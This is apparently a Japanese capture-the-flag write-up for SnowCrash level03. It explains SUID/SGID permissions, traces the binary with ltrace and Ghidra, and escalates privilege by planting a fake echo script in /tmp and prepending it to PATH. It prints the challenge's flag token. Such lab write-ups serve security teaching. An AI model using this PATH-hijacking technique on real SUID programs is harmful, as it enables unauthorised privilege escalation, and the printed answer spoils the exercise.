
```sh
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```


-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

SUID (s in owner権限位置):
プログラム実行時、実行者は一時的にファイル所有者 (この場合 flag03) の権限で実行できます
バイナリファイル実行時のみ有効
SGID (s in group権限位置):
プログラム実行時、実行者は一時的にファイルのグループ (この場合 level03) の権限で実行できます

https://docs.oracle.com/cd/E19455-01/806-2718/secfiles-69/index.html

実ユーザーIDと実効ユーザーIDが異なる場合、実効ユーザーIDがファイルの所有者である場合、ファイルの所有者の権限が使用されます。

実行してみる

```sh
level03@SnowCrash:~$ ./level03
Exploit me
```

level03の実行ファイルがあるので、中身を見る

```sh
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                                                   = 2003
geteuid()                                                                                                                                   = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                      = 0
+++ exited (status 0) +++
```

/usr/bin/env echo Exploit me"Exploit me が実行されている


偽のechoを作成して、PATHを変更する

```sh
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
```

```sh
export PATH=/tmp:$PATH
```

答えが見える

```sh
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```


## 補足

ギドラだと、以下のようなコードになっている

```
void main(void)
{
  __gid_t __rgid;
  __uid_t __ruid;

  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  system("/usr/bin/env echo Exploit me");
  return;
}
```

system()関数を使用するとき、セキュリティ上の理由から、ライブラリやシェルはプロセスの効果的ユーザーIDを実ユーザーIDに戻すことがあります。これは、特権のエスカレーションを防ぐための一般的な安全対策です。

しかし、このプログラムでは、setresuid()とsetresgid()を使用して、実ユーザーIDと効果的ユーザーIDを同じに設定し、特権が維持されるようにしています。これにより、system()を呼び出したときに、特権が失われることを防いでいます。

もしこのコードがなければ、system()呼び出し時に実効ユーザーIDが実ユーザーID（level03）にリセットされ、getflagを実行する権限がなくなります。
